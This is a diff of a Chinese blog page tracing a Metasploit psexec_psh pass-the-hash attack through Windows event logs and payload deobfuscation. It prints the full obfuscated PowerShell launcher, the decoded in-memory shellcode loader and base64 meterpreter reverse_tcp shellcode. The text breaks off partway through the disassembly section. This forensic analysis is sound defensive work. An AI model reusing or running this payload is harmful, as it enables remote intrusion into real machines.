@@ -89,6 +89,9 @@
     </nav>
 
 </header>
+
+//<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
 <script>
     var mobileBtn = function f() {
         var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
@@ -102,6 +105,7 @@
         }
     }
 </script>
+
         <div class="main">
             <div class="container">
     
@@ -198,32 +202,46 @@
         </header>
 
         <div class="post-content">
-            <h1 id="Psexec溯源"><a href="#Psexec溯源" class="headerlink" title="Psexec溯源"></a>Psexec溯源</h1><p>本文目的为记述攻防模拟中Psexec执行后的溯源知识点。</p>
-<h2 id="1-安全日志解析"><a href="#1-安全日志解析" class="headerlink" title="1. 安全日志解析"></a>1. 安全日志解析</h2><p>使用Metasplot中的<code>/exploit/windows/smb/psexec_psh</code>模块，payload为<code>meterpreter/reverse_tcp</code>进行Pth攻击。</p>
+            <h1 id="psexec溯源"><a class="markdownIt-Anchor" href="#psexec溯源"></a> Psexec溯源</h1>
+<p>本文目的为记述攻防模拟中Psexec执行后的溯源知识点。</p>
+<h2 id="1-安全日志解析"><a class="markdownIt-Anchor" href="#1-安全日志解析"></a> 1. 安全日志解析</h2>
+<p>使用Metasplot中的<code>/exploit/windows/smb/psexec_psh</code>模块，payload为<code>meterpreter/reverse_tcp</code>进行Pth攻击。</p>
 <p>在靶机上的日志<code>windows日志-&gt;系统日志-&gt;ID 7045</code>会有执行Psexec的记录</p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325163730525.png" alt="image-20200325163730525"></p>
 <p>查看详细信息，能看到执行的账户信息——<code>SID</code></p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325172725319.png" alt="image-20200325172725319"></p>
 <p>用WMI查询域内的用户信息<code>SID</code></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">xxx</span>&gt; <span class="title">wmic</span> <span class="title">useraccount</span>  <span class="title">get</span> <span class="title">sid</span>,<span class="title">Caption</span></span></span><br><span class="line"><span class="function"><span class="title">Caption</span>            <span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">GOD</span>\<span class="title">Administrator</span>  <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-500</span></span><br><span class="line"><span class="function"><span class="title">GOD</span>\<span class="title">krbtgt</span>         <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-502</span></span><br><span class="line"><span class="function"><span class="title">GOD</span>\<span class="title">liukaifeng01</span>   <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-1000</span></span><br></pre></td></tr></table></figure>
+<pre class="highlight"><code class="cmd"><span class="function">C:\<span class="title">Users</span>\<span class="title">xxx</span>&gt; <span class="title">wmic</span> <span class="title">useraccount</span>  <span class="title">get</span> <span class="title">sid</span>,<span class="title">Caption</span>
+<span class="title">Caption</span>            <span class="title">SID</span>
+<span class="title">GOD</span>\<span class="title">Administrator</span>  <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-500
+<span class="title">GOD</span>\<span class="title">krbtgt</span>         <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-502
+<span class="title">GOD</span>\<span class="title">liukaifeng01</span>   <span class="title">S</span>-1-5-21-2952760202-1353902439-2381784089-1000
+</span></code></pre>
 <p>对照<code>SID</code>可知，是<code>GOD\Administrator</code>执行的远程命令。</p>
 <p>对此，其他安全研究员总结出了其他一些可能会产生的日志，在此作为记录。</p>
 <blockquote>
 <ol>
-<li><p>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event 7045这两种事件日志。需要注意的是，Event 4697日志记录将有可能包含账号信息。</p>
+<li>
+<p>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event 7045这两种事件日志。需要注意的是，Event 4697日志记录将有可能包含账号信息。</p>
 </li>
-<li><p>还有可能预生成Event 4624和Event 4652 Windows事件日志，日志会记录下该工具的使用数据。</p>
+<li>
+<p>还有可能预生成Event 4624和Event 4652 Windows事件日志，日志会记录下该工具的使用数据。</p>
 </li>
-<li><p>可执行程序PSEXESVC.EXE将会被提取至Windows目录下，然后再执行远程操作。</p>
+<li>
+<p>可执行程序PSEXESVC.EXE将会被提取至Windows目录下，然后再执行远程操作。</p>
 </li>
 </ol>
 <p><a href="https://kknews.cc/tech/qeqk8py.html" target="_blank" rel="noopener">https://kknews.cc/tech/qeqk8py.html</a></p>
 </blockquote>
-<h2 id="2-解码powershell"><a href="#2-解码powershell" class="headerlink" title="2. 解码powershell"></a>2. 解码powershell</h2><p>再来继续追查执行的powershell代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务名称: KyXUNYhzWKXprClF</span><br><span class="line">%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &quot;if([IntPtr]::Size -eq 4)&#123;$b=&apos;powershell.exe&apos;&#125;else&#123;$b=$env:windir+&apos;\syswow64\WindowsPowerShell\v1.0\powershell.exe&apos;&#125;;$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&apos;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&apos;&apos;H4sIAAUHe14CA7VW+2/aSBD+uZHyP1gVErZCMA40aSJVujVvggnEQHgUnRZ7bS9Ze8Fe8+r1f78x4DRV07v2pLPyWO/OzM58882MnTiwBOWBtLimnvTl/OxdF4fYl+TMhtRyUmb7JzOUd+9gP+N0htsr6ZMkT9FyWeE+psHs7q4chyEJxPE9XycCRRHx54ySSFakv6Qnj4Tk8mG+IJaQvkiZP/N1xueYncR2ZWx5RLpEgZ2ctbmFE3fy5pJRIWc/f84q00ttlq+uYswiOWvuIkH8vM1YVpG+KsmF/d2SyFmDWiGPuCPyTzQoXuUHQYQd0gFra2IQ4XE7yioQBvyERMRhIB0DSiwcz+UsLLsht5BthySKsjlpmtiezmZ/yNPTxY9xIKhP8s1AkJAvTRKuqUWifAMHNiOPxJmBlilCGrgzRQGxNX8mciaIGctJv2NG7pBNCtuvKsmvlUCqK0IlB6l8K1CD2zEjR9XsG54m+VfgSTkA2H09Pzs/c1LCOA/XndeEgdW76WFNwD25yyN6kPskFXKSAfdgwcMdvGb6YUyU2Qu4UiY0y5Pcz/W1VBhE9x2/CFvTIaf2DFROKc2wtcFXycHPuVkhDg1IZRdgn1op/eS3cCYOI4cg86lYB7ySs6cDYlcIIy4WCXBJun9Qq/pUvOjqMWU2CZEFuYrAK0ij8r0zx1zI2WZgEB9AOr4D/zIOkJ6k0iei79Lbk3cQypYZjqKc1I2h6qycZBLMiJ2TUBDR0xGKBT8ss9/cNWImqIUjkZqbKS9Ani4s8yASYWxB4iD4vrkkFsUswSInNahN9J1J3fTi7JtIlDFjUAtgaQ2ZgJ0EAVMkdAjBx0PqlbxJRNNfMuKDzKH+awy7UO0nxh/4g11iZ39wMWX0kb4JGikMrxyEFJuMi5w0pKGAPpIgmxDpv93/qoMcPSmH5JQNOa2Sqb4TCbcz9npLbhNenqA5ABEKAKEWcl/HEbkuHduF/F59oGUEz7gZMMPSn6mGNlRrGvA7oMUmr9zY961FQw0rW89BzahpNLqVXqNRWrfMYUmY1aa47zaFUR0tFiZqPA7GYtJEjT4tPI9L+2WL7s02ssdb9Xqv7zcFfbtfuLYzrjiOe+OYj9qHGm0/lXt64Qq3K9W4/aRv9EIpqtJNo0cHvedWTczHQ4YHjuqOtFtMt+1wMdS4sW8iVPeK1r7lDOueYe/GDUoWaqFNe6iH0L31OBjU3aVbj5B6O1yV/QVaVcwuRuCdX259YHpvUNPRoKr38APvFi8qqjaxV9XaZIRbPrPrDVUbj5CNQrXvetrNgxckOGFXX+mJDGpPdjUVZLol1Chd0f1k1au7qAoyQ58jXKPPg4sR2Oz0QedpoNkciaA5UtWhq7rIMb0xRjpI6ytU03l597FrdNXh8MrT5s+aBz6T0fqj0UIXNaurquqFP4e/KrKM5TYY6Zubtdsw+T2+x8P1pKhq/U3dQSt0caFr+lw0qsXWGu7tq7eDT+8TBgGFMhy9YsXPOruBw8jDDNgCHTut0xoPa6cm3OU00ZDlw/R+JmFAGMw+mI4p1RFj3EqGwKFdwwA6joVkSg1gWbx6c6VIL4LKt9mQbt3dTcBLKJ4DufNtErjCyxW2xUIBWn1hWypAkL8eWpkvd/LRVi6ZFQDNi212sK0kJZWZs0H19v8F7VTJHvyz/w20b3v/cPpLQBZyScg/bH6/8VuQ/nbgT5gKkDShDzFynIZvx3/ix6sPhkNaIPvO6Uk++h5icdmBD4nzs78BLEJS2GAKAAA=&apos;&apos;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&apos;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&apos;Hidden&apos;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;</span><br></pre></td></tr></table></figure>
-<p>代码有点绕，我们可以直接使用 Unit42安全团队的powershell自动反混淆工具 </p>
-<p><a href="https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler" target="_blank" rel="noopener">https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler</a> </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PowerShellProfiler.py -f ./test_power.txt -d</span><br></pre></td></tr></table></figure>
+<h2 id="2-解码powershell"><a class="markdownIt-Anchor" href="#2-解码powershell"></a> 2. 解码powershell</h2>
+<p>再来继续追查执行的powershell代码。</p>
+<pre class="highlight"><code class="">服务名称: KyXUNYhzWKXprClF
+%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &quot;if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAAUHe14CA7VW+2/aSBD+uZHyP1gVErZCMA40aSJVujVvggnEQHgUnRZ7bS9Ze8Fe8+r1f78x4DRV07v2pLPyWO/OzM58882MnTiwBOWBtLimnvTl/OxdF4fYl+TMhtRyUmb7JzOUd+9gP+N0htsr6ZMkT9FyWeE+psHs7q4chyEJxPE9XycCRRHx54ySSFakv6Qnj4Tk8mG+IJaQvkiZP/N1xueYncR2ZWx5RLpEgZ2ctbmFE3fy5pJRIWc/f84q00ttlq+uYswiOWvuIkH8vM1YVpG+KsmF/d2SyFmDWiGPuCPyTzQoXuUHQYQd0gFra2IQ4XE7yioQBvyERMRhIB0DSiwcz+UsLLsht5BthySKsjlpmtiezmZ/yNPTxY9xIKhP8s1AkJAvTRKuqUWifAMHNiOPxJmBlilCGrgzRQGxNX8mciaIGctJv2NG7pBNCtuvKsmvlUCqK0IlB6l8K1CD2zEjR9XsG54m+VfgSTkA2H09Pzs/c1LCOA/XndeEgdW76WFNwD25yyN6kPskFXKSAfdgwcMdvGb6YUyU2Qu4UiY0y5Pcz/W1VBhE9x2/CFvTIaf2DFROKc2wtcFXycHPuVkhDg1IZRdgn1op/eS3cCYOI4cg86lYB7ySs6cDYlcIIy4WCXBJun9Qq/pUvOjqMWU2CZEFuYrAK0ij8r0zx1zI2WZgEB9AOr4D/zIOkJ6k0iei79Lbk3cQypYZjqKc1I2h6qycZBLMiJ2TUBDR0xGKBT8ss9/cNWImqIUjkZqbKS9Ani4s8yASYWxB4iD4vrkkFsUswSInNahN9J1J3fTi7JtIlDFjUAtgaQ2ZgJ0EAVMkdAjBx0PqlbxJRNNfMuKDzKH+awy7UO0nxh/4g11iZ39wMWX0kb4JGikMrxyEFJuMi5w0pKGAPpIgmxDpv93/qoMcPSmH5JQNOa2Sqb4TCbcz9npLbhNenqA5ABEKAKEWcl/HEbkuHduF/F59oGUEz7gZMMPSn6mGNlRrGvA7oMUmr9zY961FQw0rW89BzahpNLqVXqNRWrfMYUmY1aa47zaFUR0tFiZqPA7GYtJEjT4tPI9L+2WL7s02ssdb9Xqv7zcFfbtfuLYzrjiOe+OYj9qHGm0/lXt64Qq3K9W4/aRv9EIpqtJNo0cHvedWTczHQ4YHjuqOtFtMt+1wMdS4sW8iVPeK1r7lDOueYe/GDUoWaqFNe6iH0L31OBjU3aVbj5B6O1yV/QVaVcwuRuCdX259YHpvUNPRoKr38APvFi8qqjaxV9XaZIRbPrPrDVUbj5CNQrXvetrNgxckOGFXX+mJDGpPdjUVZLol1Chd0f1k1au7qAoyQ58jXKPPg4sR2Oz0QedpoNkciaA5UtWhq7rIMb0xRjpI6ytU03l597FrdNXh8MrT5s+aBz6T0fqj0UIXNaurquqFP4e/KrKM5TYY6Zubtdsw+T2+x8P1pKhq/U3dQSt0caFr+lw0qsXWGu7tq7eDT+8TBgGFMhy9YsXPOruBw8jDDNgCHTut0xoPa6cm3OU00ZDlw/R+JmFAGMw+mI4p1RFj3EqGwKFdwwA6joVkSg1gWbx6c6VIL4LKt9mQbt3dTcBLKJ4DufNtErjCyxW2xUIBWn1hWypAkL8eWpkvd/LRVi6ZFQDNi212sK0kJZWZs0H19v8F7VTJHvyz/w20b3v/cPpLQBZyScg/bH6/8VuQ/nbgT5gKkDShDzFynIZvx3/ix6sPhkNaIPvO6Uk++h5icdmBD4nzs78BLEJS2GAKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);&quot;
+</code></pre>
+<p>代码有点绕，我们可以直接使用 Unit42安全团队的powershell自动反混淆工具</p>
+<p><a href="https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler" target="_blank" rel="noopener">https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler</a></p>
+<pre class="highlight"><code class="">python3 PowerShellProfiler.py -f ./test_power.txt -d
+</code></pre>
 <p>然后就可以直接看到要执行的核心powershell代码</p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325164205204.png" alt="image-20200325164205204"></p>
 <p>当然我们也可以按照函数的本意，在这里 <a href="https://gchq.github.io/CyberChef" target="_blank" rel="noopener">https://gchq.github.io/CyberChef</a> 按照代码逻辑一步一步decode。</p>
@@ -231,22 +249,223 @@
 <p>FromBase64 + Gunzip</p>
 <p><img src="/2020/03/01/Psexec溯源/image-20200325164827994.png" alt="image-20200325164827994"></p>
 <p>于是我们得到核心powershell代码，如下：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> j6ih &#123;</span><br><span class="line">    <span class="keyword">Param</span> (<span class="variable">$weF</span>, <span class="variable">$x_lM</span>)		</span><br><span class="line">    <span class="variable">$fNVx2</span> = ([AppDomain]::CurrentDomain.GetAssemblies() | Where - Object &#123;</span><br><span class="line">        <span class="variable">$_</span>.GlobalAssemblyCache  - And <span class="variable">$_</span>.Location.Split(<span class="string">'\\'</span>)[ - <span class="number">1</span>].Equals(<span class="string">'System.dll'</span>) </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ).GetType(<span class="string">'Microsoft.Win32.UnsafeNativeMethods'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$fNVx2</span>.GetMethod(<span class="string">'GetProcAddress'</span>, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke(<span class="literal">$null</span>, @([System.Runtime.InteropServices.HandleRef](New - Object System.Runtime.InteropServices.HandleRef((New - Object IntPtr), (<span class="variable">$fNVx2</span>.GetMethod(<span class="string">'GetModuleHandle'</span>)).Invoke(<span class="literal">$null</span>, @(<span class="variable">$weF</span>)))), <span class="variable">$x_lM</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> fO6N &#123;</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">    [Parameter(Position = <span class="number">0</span>, Mandatory = <span class="literal">$True</span>)] [Type[]] <span class="variable">$rSCZ</span>, [Parameter(Position = <span class="number">1</span>)] [Type] <span class="variable">$zNm3</span> = [Void]</span><br><span class="line">    )</span><br><span class="line">    <span class="variable">$lvMoq</span> = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New - Object System.Reflection.AssemblyName(<span class="string">'ReflectedDelegate'</span>)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(<span class="string">'InMemoryModule'</span>, <span class="literal">$false</span>).DefineType(<span class="string">'MyDelegateType'</span>, <span class="string">'Class, Public, Sealed, AnsiClass, AutoClass'</span>, [System.MulticastDelegate])</span><br><span class="line">    <span class="variable">$lvMoq</span>.DefineConstructor(<span class="string">'RTSpecialName, HideBySig, Public'</span>, [System.Reflection.CallingConventions]::Standard, <span class="variable">$rSCZ</span>).SetImplementationFlags(<span class="string">'Runtime, Managed'</span>)</span><br><span class="line">    <span class="variable">$lvMoq</span>.DefineMethod(<span class="string">'Invoke'</span>, <span class="string">'Public, HideBySig, NewSlot, Virtual'</span>, <span class="variable">$zNm3</span>, <span class="variable">$rSCZ</span>).SetImplementationFlags(<span class="string">'Runtime, Managed'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$lvMoq</span>.CreateType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[Byte[]]<span class="variable">$dvxe9</span> = [System.Convert]::FromBase64String(<span class="string">"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqDSPaAIAHmCJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U="</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$oA</span> = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll VirtualAlloc), (fO6N @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, <span class="variable">$dvxe9</span>.Length, <span class="number">0</span>x3000, <span class="number">0</span>x40)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::Copy(<span class="variable">$dvxe9</span>, <span class="number">0</span>, <span class="variable">$oA</span>, <span class="variable">$dvxe9</span>.length)</span><br><span class="line"><span class="variable">$blUE9</span> = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll CreateThread), (fO6N @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, <span class="number">0</span>, <span class="variable">$oA</span>, [IntPtr]::Zero, <span class="number">0</span>, [IntPtr]::Zero)</span><br><span class="line">[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll WaitForSingleObject), (fO6N @([IntPtr], [Int32]))).Invoke(<span class="variable">$blUE9</span>, <span class="number">0</span>xffffffff) | Out - Null</span><br></pre></td></tr></table></figure>
-<h2 id="3-ShellCode"><a href="#3-ShellCode" class="headerlink" title="3. ShellCode"></a>3. ShellCode</h2><p>从<code>kernel32.dll</code>和<code>VirtualAlloc</code>容易判断出，变量<code>$dvxe9</code>是Base64后的Shellcode。</p>
+<pre class="highlight"><code class="powershell"><span class="keyword">function</span> j6ih {
+    <span class="keyword">Param</span> (<span class="variable">$weF</span>, <span class="variable">$x_lM</span>)		
+    <span class="variable">$fNVx2</span> = ([AppDomain]::CurrentDomain.GetAssemblies() | Where - Object {
+        <span class="variable">$_</span>.GlobalAssemblyCache  - And <span class="variable">$_</span>.Location.Split(<span class="string">'\\'</span>)[ - <span class="number">1</span>].Equals(<span class="string">'System.dll'</span>) 
+    }
+
+    ).GetType(<span class="string">'Microsoft.Win32.UnsafeNativeMethods'</span>)
+    <span class="keyword">return</span> <span class="variable">$fNVx2</span>.GetMethod(<span class="string">'GetProcAddress'</span>, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke(<span class="literal">$null</span>, @([System.Runtime.InteropServices.HandleRef](New - Object System.Runtime.InteropServices.HandleRef((New - Object IntPtr), (<span class="variable">$fNVx2</span>.GetMethod(<span class="string">'GetModuleHandle'</span>)).Invoke(<span class="literal">$null</span>, @(<span class="variable">$weF</span>)))), <span class="variable">$x_lM</span>))
+}
+
+<span class="keyword">function</span> fO6N {
+    <span class="keyword">Param</span> (
+    [Parameter(Position = <span class="number">0</span>, Mandatory = <span class="literal">$True</span>)] [Type[]] <span class="variable">$rSCZ</span>, [Parameter(Position = <span class="number">1</span>)] [Type] <span class="variable">$zNm3</span> = [Void]
+    )
+    <span class="variable">$lvMoq</span> = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New - Object System.Reflection.AssemblyName(<span class="string">'ReflectedDelegate'</span>)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(<span class="string">'InMemoryModule'</span>, <span class="literal">$false</span>).DefineType(<span class="string">'MyDelegateType'</span>, <span class="string">'Class, Public, Sealed, AnsiClass, AutoClass'</span>, [System.MulticastDelegate])
+    <span class="variable">$lvMoq</span>.DefineConstructor(<span class="string">'RTSpecialName, HideBySig, Public'</span>, [System.Reflection.CallingConventions]::Standard, <span class="variable">$rSCZ</span>).SetImplementationFlags(<span class="string">'Runtime, Managed'</span>)
+    <span class="variable">$lvMoq</span>.DefineMethod(<span class="string">'Invoke'</span>, <span class="string">'Public, HideBySig, NewSlot, Virtual'</span>, <span class="variable">$zNm3</span>, <span class="variable">$rSCZ</span>).SetImplementationFlags(<span class="string">'Runtime, Managed'</span>)
+    <span class="keyword">return</span> <span class="variable">$lvMoq</span>.CreateType()
+}
+
+[Byte[]]<span class="variable">$dvxe9</span> = [System.Convert]::FromBase64String(<span class="string">"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqDSPaAIAHmCJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U="</span>)
+
+<span class="variable">$oA</span> = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll VirtualAlloc), (fO6N @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, <span class="variable">$dvxe9</span>.Length, <span class="number">0</span>x3000, <span class="number">0</span>x40)
+[System.Runtime.InteropServices.Marshal]::Copy(<span class="variable">$dvxe9</span>, <span class="number">0</span>, <span class="variable">$oA</span>, <span class="variable">$dvxe9</span>.length)
+<span class="variable">$blUE9</span> = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll CreateThread), (fO6N @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, <span class="number">0</span>, <span class="variable">$oA</span>, [IntPtr]::Zero, <span class="number">0</span>, [IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((j6ih kernel32.dll WaitForSingleObject), (fO6N @([IntPtr], [Int32]))).Invoke(<span class="variable">$blUE9</span>, <span class="number">0</span>xffffffff) | Out - Null
+</code></pre>
+<h2 id="3-shellcode"><a class="markdownIt-Anchor" href="#3-shellcode"></a> 3. ShellCode</h2>
+<p>从<code>kernel32.dll</code>和<code>VirtualAlloc</code>容易判断出，变量<code>$dvxe9</code>是Base64后的Shellcode。</p>
 <p>用python Base64解一下，变成<code>\x00\xff\x12\x33</code>这样的十六进制格式，方便后续解码。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> d</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>code = <span class="string">""</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">""</span>.join(list(map(<span class="keyword">lambda</span> y:<span class="string">"\\x%x"</span>%y,d(code)))))</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><code class="python"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> d
+<span class="meta">&gt;&gt;&gt; </span>code = <span class="string">""</span>
+<span class="meta">&gt;&gt;&gt; </span>print(<span class="string">""</span>.join(list(map(<span class="keyword">lambda</span> y:<span class="string">"\\x%x"</span>%y,d(code)))))
+</code></pre>
 <p>存文件丢IDA或者直接放在线网站解shellcode</p>
-<p> <a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" rel="noopener">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a> </p>
+<p><a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" rel="noopener">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p>
 <p>得到汇编</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 